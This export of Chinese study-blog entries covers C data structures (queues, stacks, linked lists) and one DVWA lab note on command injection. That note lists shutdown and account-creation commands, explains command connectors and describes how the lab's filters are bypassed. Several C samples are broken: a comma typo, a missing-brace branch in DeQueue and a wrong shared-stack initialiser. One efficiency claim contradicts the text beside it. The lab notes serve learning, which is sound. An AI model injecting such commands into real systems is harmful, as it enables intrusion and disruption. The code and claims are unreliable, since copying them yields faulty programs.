Q.rear-&gt;next = s;</span><br><span class="line">        Q,rear = s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="出队"><a href="#出队" class="headerlink" title="出队"></a>出队</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//队头元素出队（带头结点）</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(LinkQueue &amp;Q,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;               <span class="comment">//空队</span></span><br><span class="line">    LinkNode *p=Q.front-&gt;next;</span><br><span class="line">    x=p-&gt;data;                      <span class="comment">//变量x返回头元素</span></span><br><span class="line">    Q.front-&gt;next=p-&gt;next;          <span class="comment">//修改头结点的next指针</span></span><br><span class="line">    <span class="keyword">if</span>(Q.rear==p)                   <span class="comment">//最后一个结点出队</span></span><br><span class="line">        Q.rear=Q.front;             <span class="comment">//修改rear指针</span></span><br><span class="line">    <span class="built_in">free</span>(p);                        <span class="comment">//释放节点空间</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//队头元素出队（不带头结点）</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(LinkQueue &amp;Q,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;               <span class="comment">//空队</span></span><br><span class="line">    LinkNode *p=Q.front;</span><br><span class="line">    x=p-&gt;data;                      <span class="comment">//变量x返回头元素</span></span><br><span class="line">    Q.front=p-&gt;next;          <span class="comment">//修改头结点的next指针</span></span><br><span class="line">    <span class="keyword">if</span>(Q.rear==p)                   <span class="comment">//最后一个结点出队</span></span><br><span class="line">        Q.rear=null;              <span class="comment">//front指向null</span></span><br><span class="line">        Q.front=null;             <span class="comment">//修改rear指针指向NULL</span></span><br><span class="line">    <span class="built_in">free</span>(p);                        <span class="comment">//释放节点空间</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="队列满的情况"><a href="#队列满的情况" class="headerlink" title="队列满的情况"></a>队列满的情况</h3><p>链式存储——一般不会队满，除非内存不足</p>
<h2 id="双端队列"><a href="#双端队列" class="headerlink" title="双端队列"></a>双端队列</h2><p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603174425521.png" style="zoom: 67%;"></p>
<p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603174505573.png" style="zoom:67%;"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>栈与队列</tag>
      </tags>
  </entry>
  <entry>
    <title>栈</title>
    <url>/2022/08/13/%E6%A0%88/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>s栈的初步理解以及顺序栈和链栈定义和基本操作的代码实现</p>
<span id="more"></span>
<h2 id="栈的定义"><a href="#栈的定义" class="headerlink" title="栈的定义"></a>栈的定义</h2><p>栈（stack）是值允许在一端进行插入或者删除操作的线性表</p>
<p><img src="/2022/08/13/%E6%A0%88/image-20220602162636874.png" style="zoom:50%;"></p>
<h3 id="重要术语"><a href="#重要术语" class="headerlink" title="重要术语"></a>重要术语</h3><p>空栈，栈顶 ，栈底<img src="/2022/08/13/%E6%A0%88/image-20220602162853052.png" alt></p>
<p>逻辑结构：与普通线性表相同</p>
<h3 id="栈的基本操作"><a href="#栈的基本操作" class="headerlink" title="栈的基本操作"></a>栈的基本操作</h3><p><img src="/2022/08/13/%E6%A0%88/image-20220602163140637.png" alt></p>
<p>进栈和出栈</p>
<p><img src="/2022/08/13/%E6%A0%88/image-20220602163335955.png" style="zoom:80%;"></p>
<h2 id="顺序栈的实现"><a href="#顺序栈的实现" class="headerlink" title="顺序栈的实现"></a>顺序栈的实现</h2><h3 id="初始化和判空"><a href="#初始化和判空" class="headerlink" title="初始化和判空"></a>初始化和判空</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10                  <span class="comment">//定义栈中元素的最大个数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data[MaxSize];         <span class="comment">//静态数组存放栈中元素</span></span><br><span class="line">    <span class="type">int</span> top;                        <span class="comment">//栈顶指针</span></span><br><span class="line">&#125; SqStack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(SqStack &amp;S)</span>&#123;</span><br><span class="line">    S.top=<span class="number">-1</span>;                        <span class="comment">//初始化栈顶指针         </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//因为初始化是s.top=-1</span></span><br><span class="line"><span class="comment">//判断栈空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">StackEmpty</span><span class="params">(SqStack S)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">testStack</span><span class="params">()</span>&#123;</span><br><span class="line">	SqStack S;   <span class="comment">//声明一个顺序栈（分配空间）</span></span><br><span class="line">    <span class="comment">//..后续操作。。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>顺序存储：给各个数据元素分配连续的存储空间，大小为MaxSize*sizeof(ElemType)</p>
<h3 id="进栈操作"><a href="#进栈操作" class="headerlink" title="进栈操作"></a>进栈操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">Push</span><span class="params">(SqStack &amp;S,ElemType x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(S.top==MaxSize<span class="number">-1</span>)   <span class="comment">//栈满报错</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    S.top = S.top+<span class="number">1</span>;        <span class="comment">//指针+1</span></span><br><span class="line">    S.data[S.top]=x;        <span class="comment">//新元素入栈       //替换为S.data[++S.top]=x;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="出栈和读栈顶元素操作"><a href="#出栈和读栈顶元素操作" class="headerlink" title="出栈和读栈顶元素操作"></a>出栈和读栈顶元素操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//出栈操作</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Pop</span><span class="params">(SqStack &amp;S,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top == <span class="number">-1</span>)          <span class="comment">//栈空报错</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    x=S.data[S.top];</span><br><span class="line">    S.top = S.top <span class="number">-1</span>;        <span class="comment">//x=S.data[S.top--]</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读栈顶元素</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">GetTop</span><span class="params">(SqStack S,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    x = S.data[S.top];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>top = 0时，栈满时top=maxsize=10</p>
<p>top = -1时，栈满是top=9</p>
<p>二者的入栈出栈操作正好是翻过来</p>
<h3 id="共享栈"><a href="#共享栈" class="headerlink" title="共享栈"></a>共享栈</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10              <span class="comment">//定义栈中元素的最大个数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	ElemType data[MaxSize];     <span class="comment">//静态数组存放栈中元素</span></span><br><span class="line">    <span class="type">int</span> top0;                   <span class="comment">//0号栈栈顶指针</span></span><br><span class="line">    <span class="type">int</span> top1;                   <span class="comment">//一号栈栈顶指针</span></span><br><span class="line">&#125;ShStack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(ShStack &amp;S)</span>&#123;</span><br><span class="line">    S.top=<span class="number">-1</span>;                   <span class="comment">//初始化栈顶指针</span></span><br><span class="line">    S.top=MaxSize;</span><br><span class="line">&#125;                              <span class="comment">//栈满的条件：top0 + 1 == top1</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/13/%E6%A0%88/image-20220603162012226.png" style="zoom: 50%;"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/13/%E6%A0%88/image-20220603161547608.png" alt></p>
<h2 id="链栈"><a href="#链栈" class="headerlink" title="链栈"></a>链栈</h2><p>用链式存储的栈也是一种单链表，只是在插入和删除进行了限制，例如头插法就是入栈，删除第一个结点就是出栈</p>
<h3 id="链栈的定义"><a href="#链栈的定义" class="headerlink" title="链栈的定义"></a>链栈的定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Linknode</span>&#123;</span></span><br><span class="line">    ElemType data;              <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Linknode</span> *<span class="title">next</span>;</span>      <span class="comment">//指针域</span></span><br><span class="line">&#125; *LiStack;                     <span class="comment">//栈类型定义</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/13/%E6%A0%88/image-20220603162308266.png" alt></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>栈与队列</tag>
      </tags>
  </entry>
  <entry>
    <title>顺序表和链表的比较</title>
    <url>/2022/08/11/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>对前几篇的总结，比较线性表中顺序表和链表的异同</p>
<span id="more"></span>
<h2 id="顺序表和链表的比较"><a href="#顺序表和链表的比较" class="headerlink" title="顺序表和链表的比较"></a>顺序表和链表的比较</h2><h3 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h3><p>都属于线性表，都是线性结构</p>
<h3 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h3><p><strong>顺序表</strong>   优点：支持随机存取，存储密度高</p>
<pre><code>          缺点：大片连续空间分配不方便，改变容量不方便
</code></pre><p><strong>链表</strong>       优点：离散的小空间分配方便，改变不容量方便</p>
<pre><code>           缺点：不可随机存取，存储密度低
</code></pre><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>创销 增删改查</p>
<h4 id="创"><a href="#创" class="headerlink" title="创"></a>创</h4><p>顺序表：预分配大片连续空间。静态分配：静态数组（空间大小不可改变）。动态分配：动态数组（malloc，free函数，但需要大量移动数据）</p>
<p>链表：只需分配一个头结点（或者头指针）</p>
<h4 id="销"><a href="#销" class="headerlink" title="销"></a>销</h4><p>顺序表：修改length=0，静态数组：系统自动回收空间。动态数组：需要手动free</p>
<p>链表：一次删除各个结点（free）</p>
<p><img src="/2022/08/11/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83/image-20220519211257486.png" alt></p>
<h4 id="增，删"><a href="#增，删" class="headerlink" title="增，删"></a>增，删</h4><p>顺序表：移动元素，时间复杂度O(n),时间花销主要来自移动元素</p>
<p>链表：修改指针，时间复杂度O(n),时间花销来自查找目标元素</p>
<p>链表的效率比顺序表高得多</p>
<h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><p>顺序表：按位查找：O(1)</p>
<pre><code>          按位查找：O(n)，若表内元素有序，可在
</code></pre><script type="math/tex; mode=display">
O(log_2n)</script><p>时间内找到</p>
<p>链表: 按位查找：O(n)</p>
<pre><code>     按值查找：O(n)
</code></pre><p>顺序表效率更好</p>
<p><img src="/2022/08/11/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83/image-20220519212208066-16604616041971.png" alt></p>
<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>表长难以预估，经常要增加/删除元素 ——链表</p>
<p>表长可以预估，查询（搜索）操作较多  ——顺序表</p>
<h3 id="开放式问题的答题思路"><a href="#开放式问题的答题思路" class="headerlink" title="开放式问题的答题思路"></a>开放式问题的答题思路</h3><p><img src="/2022/08/11/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83/image-20220519212403852.png" alt></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE</title>
    <url>/2022/08/10/RCE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>通过dvwa靶场进行对RCE漏洞的学习和复现</p>
<span id="more"></span>
<h1 id="命令执行漏洞（RCE"><a href="#命令执行漏洞（RCE" class="headerlink" title="命令执行漏洞（RCE)"></a>命令执行漏洞（RCE)</h1><h2 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h2><p><img src="/2022/08/10/RCE/101.png" style="zoom:67%;"></p>
<h2 id="常用的cmd命令"><a href="#常用的cmd命令" class="headerlink" title="常用的cmd命令"></a>常用的cmd命令</h2><p>whoami——查看当前用户名<br>ipconfig——查看网卡信息<br>shutdown -s -t 0——关机————（-s：shutdown    -t 0 ：time 0    立即关机）<br>net user [username] [password] /add——增加一个用户名为username密码为password的新用户<img src="/2022/08/10/RCE/201.png" alt><br>type [file_name]——查看filename文件内容<br><img src="/2022/08/10/RCE/301.png" style="zoom:67%;"></p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="Command-Injection-防御-low"><a href="#Command-Injection-防御-low" class="headerlink" title="Command Injection 防御 low"></a>Command Injection 防御 low</h3><h4 id="注入点-代码"><a href="#注入点-代码" class="headerlink" title="注入点(代码)"></a>注入点(代码)</h4><p><img src="/2022/08/10/RCE/401.png" alt></p>
<h4 id="运行实例"><a href="#运行实例" class="headerlink" title="运行实例"></a>运行实例</h4><p><img src="/2022/08/10/RCE/501.png" style="zoom:67%;"></p>
<p><img src="/2022/08/10/RCE/601.png" style="zoom:67%;"></p>
<h3 id="Command-Injection-防御-low-1"><a href="#Command-Injection-防御-low-1" class="headerlink" title="Command Injection 防御 low"></a>Command Injection 防御 low</h3><p>防御命令执行的最高效的方法，就是过滤命令连接符<br>将| ；&amp; || &amp;&amp; 符号替换成空，或判断用户输入这些符号就终止执行</p>
<h4 id="Command-Injection-防御-medium"><a href="#Command-Injection-防御-medium" class="headerlink" title="Command Injection 防御 medium"></a>Command Injection 防御 medium</h4><p><img src="/2022/08/10/RCE/701.png" alt><br>str_replace(find,replace,string,count)：字符替换函数。find：规定要查找的值    replace：规定替换find中的值    string：被搜索的字符串  count：对替换数进行计数的变量<br>array_keys(array,value,strict):返回一个包含所有键名的一个新数组。array：规定数组    value：指定健值（可选)    strict：可能的值：true  false  是否依赖类型</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需要替换的元素少于查到到的元素</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$find</span> = <span class="keyword">array</span>(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line"><span class="variable">$replace</span> = <span class="keyword">array</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;world&quot;</span>,<span class="string">&quot;!&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">str_replace</span>(<span class="variable">$find</span>,<span class="variable">$replace</span>,<span class="variable">$arr</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">运行结果</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; B [<span class="number">1</span>] =&gt; [<span class="number">2</span>] =&gt; ! )</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>( </span><br><span class="line">    <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">); </span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_keys</span>(<span class="variable">$substitutions</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$substitutions</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">运行结果</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; &amp;&amp; [<span class="number">1</span>] =&gt; ; ) <span class="title function_ invoke__">Array</span> ( [&amp;&amp;] =&gt; [;] =&gt; )</span><br></pre></td></tr></table></figure>
<h3 id="Command-Injection-攻击-medium"><a href="#Command-Injection-攻击-medium" class="headerlink" title="Command Injection 攻击 medium"></a>Command Injection 攻击 medium</h3><p>在medium防御中看到只过滤；和&amp;&amp;，所以使用其他三种即可。<br><img src="/2022/08/10/RCE/801.png" alt="image-20220805155321480" style="zoom:67%;"><br><img src="/2022/08/10/RCE/901.png" alt="image-20220805155720842" style="zoom:67%;"></p>
<h3 id="Command-Injection-防御-high"><a href="#Command-Injection-防御-high" class="headerlink" title="Command Injection 防御 high"></a>Command Injection 防御 high</h3><p><img src="/2022/08/10/RCE/1001.png" alt><br><strong>注意上面‘| ’拦截并非是|，而是|加空格</strong>————代码不规范导致的漏洞</p>
<h3 id="Command-Injection-攻击-high"><a href="#Command-Injection-攻击-high" class="headerlink" title="Command Injection 攻击 high"></a>Command Injection 攻击 high</h3><p><img src="/2022/08/10/RCE/1101.png" style="zoom:67%;"></p>
<h3 id="Command-Injection-防御-impossible"><a href="#Command-Injection-防御-impossible" class="headerlink" title="Command Injection 防御 impossible"></a>Command Injection 防御 impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];        <span class="comment">//将输入内容赋值给变量$target</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );      <span class="comment">//去除用户输入的\</span></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects </span></span><br><span class="line">    <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );       <span class="comment">//把用户输入的数据根据.分开</span></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer </span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) <span class="comment">//分别判断分成的四个部分是不是数字，并判断是不是四个数字</span></span><br><span class="line">    	&#123; </span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together. </span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>]; <span class="comment">//后端格式验证，用.拼接起来</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123; </span><br><span class="line">            <span class="comment">// Windows </span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">        &#125;                                                                   </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// *nix </span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web攻防</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>静态链表</title>
    <url>/2022/08/10/%E9%9D%99%E6%80%81%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>静态链表的定义初始化基本操作的原理和代码实现</p>
<span id="more"></span>
<h2 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>分配一整片连续的内存空间，各个结点集中安置</p>
<p><img src="/2022/08/10/%E9%9D%99%E6%80%81%E9%93%BE%E8%A1%A8/image-20220519204020786.png" alt></p>
<p>游标为-1表示以及到达表尾</p>
<p>游标充当指针</p>
<p>计算：每个数据元素4B，每个游标4B，设起始地址为addr，e1的地址为：</p>
<script type="math/tex; mode=display">
addr+8B*2</script><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10   <span class="comment">//静态链表最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>     <span class="comment">//静态链表结构类型的定义</span></span><br><span class="line">    ElemType data;   <span class="comment">//存放数据元素</span></span><br><span class="line">    <span class="type">int</span> next;        <span class="comment">//下一个元素的数组下标</span></span><br><span class="line">&#125;SLinkList[MaxSize];</span><br><span class="line"></span><br><span class="line"><span class="comment">//等价</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="type">int</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> <span class="title">SLinkList</span>[<span class="title">MaxSize</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testSLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">    SLinkList a;    <span class="comment">//a看起来是一个静态链表</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//等价</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testSLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> <span class="title">a</span>[<span class="title">MaxSize</span>];</span>  <span class="comment">//a看起来是一个node型数组</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>将a[0]的next设置为-1</p>
<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p>从头结点出发遍历结点</p>
<p>时间复杂度为O(n)</p>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p>(1)找到一个空的结点，存入数据元素</p>
<p>(2)从头结点出发找到位序为i-1的结点</p>
<p>(3)修改新结点的next</p>
<p>(4)修改i-号结点的next</p>
<p>如何判断为空？————可以让next设置为特殊值</p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>(1)从头结点出发找到前驱结点</p>
<p>(2)修改前驱结点的游标</p>
<p>(3)被删除的结点next设为-2</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>静态链表：用数组的方式实现的链表</p>
<p>逻辑上相邻的元素可以在物理上不相邻</p>
<p>优点：增删操作不需要大量移动元素</p>
<p>缺点：不能随机存取，固定容量不可变</p>
<p>使用场景：不支持指针的低级语言。数据元素数量固定不变的场景（操作系统的文件分配表）</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>循环链表</title>
    <url>/2022/08/10/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>循环单链表和循环双链表的代码实现</p>
<span id="more"></span>
<h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><p>分为：循环单链表，循环双链表</p>
<p><img src="/2022/08/10/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/image-20220519201322333.png" alt></p>
